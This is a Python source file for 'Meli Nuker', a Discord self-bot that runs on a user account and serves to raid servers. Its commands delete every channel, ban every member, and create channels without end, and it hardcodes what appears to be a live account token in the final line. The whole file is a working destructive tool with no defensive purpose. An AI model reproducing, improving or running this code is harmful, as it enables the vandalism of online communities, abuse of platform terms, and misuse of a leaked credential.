import discord
import asyncio
import requests
import discord
import os
import ctypes
import colorama
from discord.ext import commands
from discord.ext.commands import Bot
from colorama import Fore

client = commands.Bot(command_prefix="-", self_bot=True, case_insensitive=True)
client.remove_command('help')


def Clear():
    os.system('cls')

def banner():
    Servers = len(client.guilds)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Meli Nuker')
    os.system('cls')
    Servers = len(client.guilds)
    friends = len(client.user.friends)
    Clear()
    r = f'{Fore.RED}'
    w = f'{Fore.WHITE}'
    print(f'''
                               {w}════════════════════════════════════════════════════════════════


{r}                                                ███▄ ▄███▓▓█████  ██▓     ██▓
{r}                                                ▓██▒▀█▀ ██▒▓█   ▀ ▓██▒    ▓██▒
{r}                                                ▓██    ▓██░▒███   ▒██░    ▒██▒
{r}                                                ▒██    ▒██ ▒▓█  ▄ ▒██░    ░██░
{r}                                                ▒██▒   ░██▒░▒████▒░██████▒░██░
{r}                                                ░ ▒░   ░  ░░░ ▒░ ░░ ▒░▓  ░░▓  
{r}                                                ░  ░      ░ ░ ░  ░░ ░ ▒  ░ ▒ ░
{r}                                                ░      ░      ░     ░ ░    ▒ ░
{r}                                                ░      ░  ░    ░  ░ ░  


                                             {r}User:    {w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
                                             made by rain#0004 & envy#1212
                                             discord.gg/meli
                               {w}════════════════════════════════════════════════════════════════
''' + Fore.RESET)

@client.event
async def on_connect():
    Servers = len(client.guilds)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Meli Nuker')
    os.system('cls')
    Servers = len(client.guilds)
    friends = len(client.user.friends)
    Clear()
    r = f'{Fore.RED}'
    w = f'{Fore.WHITE}'
    print(f'''
{Fore.BLUE} 

                               ════════════════════════════════════════════════════════════════


                                                ███▄ ▄███▓▓█████  ██▓     ██▓
                                                ▓██▒▀█▀ ██▒▓█   ▀ ▓██▒    ▓██▒
                                                ▓██    ▓██░▒███   ▒██░    ▒██▒
                                                ▒██    ▒██ ▒▓█  ▄ ▒██░    ░██░
                                                ▒██▒   ░██▒░▒████▒░██████▒░██░
                                                ░ ▒░   ░  ░░░ ▒░ ░░ ▒░▓  ░░▓  
                                               ░  ░      ░ ░ ░  ░░ ░ ▒  ░ ▒ ░
                                                ░      ░      ░     ░ ░    ▒ ░
                                                ░      ░  ░    ░  ░ ░  


                                             {r}User:{w}[{r}{client.user.name}{w}#{r}{client.user.discriminator}{w}] 
                                                
                               {w}════════════════════════════════════════════════════════════════
''' + Fore.RESET)



















# -> Start of commands



@client.command()
async def masschannel(ctx, name):
    await ctx.message.delete()
    while 1:
         await ctx.guild.create_text_channel(name=f"{name}")   
         await ctx.guild.create_voice_channel(name=f"{name}")  
@client.command()
async def massban(ctx):
    for user in ctx.guild.members:
        try:
            await user.ban()
        except:
            pass 
@client.command()
async def nuke(ctx):       
    while 1:
         for channel in list(ctx.message.guild.channels):
                await channel.delete() 
                      
         print(f"channel {ctx.channel.name} Has Been Deleted")       
         await ctx.guild.create_text_channel(name="COLD-LUVS-YOU")   
         await ctx.guild.create_voice_channel(name="COLD-LUVS-YOU")   
         await ctx.guild.create_category(name='Cold Was Here')
         await ctx.guild.create_voice_channel(name="Cold Luvs You") 
         await ctx.guild.create_text_channel(name="Cold Luvs You")
         embed = discord.Embed(title='MAKING CHANNELS :sob:', color=0x328fa8)
         embed.set_thumbnail(url=ctx.author.avatar_url)
         embed.set_image(url=ctx.author.avatar_url)
         await ctx.send(embed=embed)
         for user in ctx.guild.members:
                await user.ban() 
@client.command()
async def nukechannel(ctx):
    while 1: 
            await ctx.guild.create_category(name='Meli was here')
            await ctx.guild.create_voice_channel(name=f"Meli was here.") 
            await ctx.guild.create_text_channel(name=f"Meli loves you")
    try:
            embed = discord.Embed(title='Wizzing server.', color=0x328fa8)
            embed.set_thumbnail(url=ctx.author.avatar_url)
            embed.set_image(url=ctx.author.avatar_url)
            embed.set_footer(text=f'Made by rain#0004 and envy#1212')
            await ctx.send(embed=embed, delete_after=10)
    except:
           pass   

@client.command()
async def delchannels(ctx):
    while 1:
         for channel in list(ctx.message.guild.channels):
                await channel.delete() 
              
@client.command()
async def meli(ctx):       
    while 1:
         for channel in list(ctx.message.guild.channels):
                await channel.delete() 
             
         for user in ctx.guild.members:
                await user.ban()          
         await ctx.guild.create_text_channel(name="rain-and-envy-loves-you")   
         await ctx.guild.create_voice_channel(name="rain and envy loves you")   
         await ctx.guild.create_category(name='rain and envy was Here')
         await ctx.guild.create_voice_channel(name="rain and envy Luvs You") 
         await ctx.guild.create_text_channel(name="rain and envy Luvs You")
         embed = discord.Embed(title='Wizzing server.', color=0x328fa8)
         embed.set_footer(text=f'Made by rain#0004 and envy#1212')
         embed.set_thumbnail(url=ctx.author.avatar_url)
         embed.set_image(url=ctx.author.avatar_url)
         await ctx.send(embed=embed,delete_after=10)       
         



@client.command()
async def help(ctx):
    await ctx.message.delete() 
    embed=discord.Embed(title=f"**Meli**", description=f"━━━━━━━━━━━━━━━━━━━━━\n`𝘮𝘢𝘴𝘴𝘣𝘢𝘯\n 𝘣𝘢𝘯𝘴 𝘦𝘷𝘦𝘳𝘺𝘰𝘯𝘦 𝘪𝘯 𝘢 𝘴𝘦𝘳𝘷𝘦𝘳\n\n━━━━━━━━━━━━━━━━━━━━━", color=0x00000)
    embed.set_image(url="https://data.whicdn.com/images/344710960/original.gif")
    
    embed.set_footer(text=f'meli')
    await ctx.send(embed=embed,delete_after=10)
client.run("NjcwMjQwMjY3NDg3NDEyMjI0.X_FdOw.VtUNKZ4n3OdkeXZfCsrN4FWY5Ho", bot=False)    
